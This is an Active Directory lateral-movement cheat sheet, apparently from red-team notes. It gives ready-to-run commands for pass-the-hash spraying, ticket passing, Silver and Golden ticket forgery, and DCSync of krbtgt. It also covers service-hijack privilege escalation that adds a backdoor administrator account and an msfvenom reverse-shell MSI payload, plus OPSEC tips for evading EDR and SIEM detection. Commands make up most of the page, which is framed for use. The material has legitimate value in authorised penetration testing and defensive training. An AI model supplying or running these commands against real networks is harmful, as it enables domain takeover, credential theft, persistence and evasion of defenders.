---
title: Lateral Movement & Attacks
---

Once you've looted creds — NTLM hashes, Kerberos tickets, service account passwords — the goal is to reuse them laterally and escalate. This page is the field reference for the credential-reuse primitives (PtH / PtT / OPtH), ticket forgery (Silver / Golden), the Kerberos double-hop workaround, and the service-side misconfigs that still land SYSTEM in 2026.

## Pass-the-Hash (PtH)

NTLM hashes authenticate as well as the password itself over SMB / WMI / WinRM. No cracking required.

```bash
# Spray a hash across a subnet — confirm where it lands admin
crackmapexec smb 10.10.10.0/24 -u administrator -H <NTLM>
crackmapexec smb <target> -u <user> -H <NTLM> --local-auth   # local SAM hash

# Impacket — interactive shells
impacket-psexec   <DOMAIN>/<user>@<target> -hashes :<NT>
impacket-wmiexec  <DOMAIN>/<user>@<target> -hashes :<NT>     # quieter, no service created
impacket-smbexec  <DOMAIN>/<user>@<target> -hashes :<NT>

# pth-winexe (older boxes, no WinRM)
pth-winexe -U <DOMAIN>/<user>%<LM>:<NT> //<target> cmd.exe
```

> [!tip] OPSEC
> `psexec.py` drops a service + binary on ADMIN$ — loud, EDR-flagged. Prefer `wmiexec.py` or `evil-winrm` when stealth matters. Always pass `:<NT>` with the leading colon (LM half empty).

## Pass-the-Ticket (PtT)

Reuse an existing Kerberos ticket (TGT or TGS) instead of a hash. Linux `.ccache`, Windows `.kirbi`.

```bash
# Linux — load a ccache
export KRB5CCNAME=/path/to/ticket.ccache
klist
impacket-psexec -k -no-pass <DOMAIN>/<user>@<target>

# Convert between formats
impacket-ticketConverter ticket.ccache ticket.kirbi   # Linux -> Windows
impacket-ticketConverter ticket.kirbi  ticket.ccache  # Windows -> Linux
```

```powershell
# Windows — inject a kirbi into current session
.\Rubeus.exe ptt /ticket:ticket.kirbi
# or base64
.\Rubeus.exe ptt /ticket:doIFxjCCBcKg...
klist                                # confirm ticket present
```

## Overpass-the-Hash (OPtH)

NTLM/AES hash → request a real TGT → operate entirely in Kerberos (bypasses NTLM-disabled environments, feeds PtT).

```powershell
.\Rubeus.exe asktgt /user:<user> /domain:<FQDN> /rc4:<NTLM> /ptt
# AES is stealthier (RC4 TGTs ring alarms in modern SIEMs)
.\Rubeus.exe asktgt /user:<user> /domain:<FQDN> /aes256:<AES256> /ptt
```

```bash
# Linux equivalent
impacket-getTGT <DOMAIN>/<user> -hashes :<NT>
export KRB5CCNAME=<user>.ccache
```

## Silver Ticket

Forged TGS for a single service on a single host. Signed with the **service account's** NTLM/AES hash — never touches the DC, so no 4769 event there. Scoped to one SPN.

```powershell
# Mimikatz — cifs on a file server (SMB), host on a workstation (scheduled tasks/WMI)
mimikatz # kerberos::golden /service:cifs /target:FILE01.corp.local ^
          /domain:corp.local /sid:S-1-5-21-... ^
          /rc4:<service-account-NT> /user:Administrator /ptt
```

```bash
# Impacket
impacket-ticketer -nthash <service-NT> -domain-sid <SID> \
  -domain corp.local -spn cifs/FILE01.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass FILE01.corp.local
```

> [!note] Common SPN prefixes
> `cifs` (SMB), `host` (schtasks, wmi), `http` (WinRM, WSUS), `mssqlsvc` (SQL), `ldap` (DCSync when forged for a DC host).

## Golden Ticket

Forged **TGT** signed with the domain's `krbtgt` NTLM or AES key. Grants anything the KDC can issue — effectively domain admin and persistence across password resets (until krbtgt is rotated twice).

```powershell
# Mimikatz
mimikatz # lsadump::dcsync /user:corp\krbtgt          # get krbtgt NT/AES
mimikatz # kerberos::golden /user:Administrator /id:500 ^
          /domain:corp.local /sid:S-1-5-21-... ^
          /krbtgt:<krbtgt-NT> /ptt
```

```bash
# Impacket
impacket-ticketer -nthash <krbtgt-NT> -domain-sid <SID> -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC01.corp.local
```

> [!warning] Detection
> Golden tickets are logged (4769 at the DC when used). Give realistic lifetimes (`/startoffset:0 /endin:600 /renewmax:10080` in Rubeus) — a 10-year TGT is a red flag. Use `/aes256` over `/rc4` to blend in.

## Kerberos Double Hop

WinRM/PSRemoting into HOST-A → from there query the DC = failure. Your TGT was never forwarded to HOST-A, only a single TGS. Symptom: `klist` on HOST-A shows one ticket, PowerView blows up with `DirectoryServicesCOMException`.

### Fix 1 — Explicit credentials per call

```powershell
$sec  = ConvertTo-SecureString 'P@ss' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('CORP\user',$sec)
Get-DomainUser -SPN -Credential $cred
```

Works, but every tool needs a `-Credential` flag.

### Fix 2 — CredSSP (session-wide fix)

```powershell
# On the attack host (once)
Enable-WSManCredSSP -Role Client -DelegateComputer *.corp.local
# On target (needs admin)
Enable-WSManCredSSP -Role Server

# Connect with delegation
Enter-PSSession -ComputerName HOST-A -Credential $cred -Authentication CredSSP
klist   # now shows a full krbtgt TGT — onward Kerberos just works
```

### Fix 3 — Registered PSSession configuration

```powershell
Register-PSSessionConfiguration -Name adm -RunAsCredential CORP\user
Restart-Service WinRM
Enter-PSSession -ComputerName HOST-A -ConfigurationName adm
```

> [!tip] Freebie
> If the box has **unconstrained delegation** (`TrustedForDelegation=True`), the TGT is cached automatically — no workaround needed. Query with `Get-DomainComputer -Unconstrained` or BloodHound `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name`.

## Service Misconfigurations

### Unquoted service paths

Service `ImagePath` with spaces + no quotes → Windows walks the path, executing any planted binary on the way.

```powershell
# Enumerate
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
# Exploit: write %SystemDrive%\Program.exe when PathName is C:\Program Files\Vuln\svc.exe
sc start VulnSvc
```

### Modifiable service permissions

`SERVICE_CHANGE_CONFIG` on a service running as SYSTEM → rewrite `binPath=`.

```powershell
# Check with accesschk (Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" *
# Hijack
sc config VulnSvc binPath= "cmd.exe /c net user hax P@ss /add && net localgroup administrators hax /add"
sc stop VulnSvc && sc start VulnSvc
```

### AlwaysInstallElevated

Any MSI installed by any user runs as SYSTEM if both registry values are 1.

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi -o evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi
```

## Quick Reference

| Attack | Primitive | Linux | Windows |
|---|---|---|---|
| PtH | NTLM hash | `psexec.py -hashes :NT` | `Invoke-TheHash`, `Mimikatz sekurlsa::pth` |
| PtT | ccache/kirbi | `KRB5CCNAME=` | `Rubeus ptt /ticket:` |
| OPtH | hash → TGT | `getTGT.py -hashes` | `Rubeus asktgt /rc4:` |
| Silver | service hash | `ticketer.py -spn` | `kerberos::golden /service:` |
| Golden | krbtgt hash | `ticketer.py` (no -spn) | `kerberos::golden /krbtgt:` |
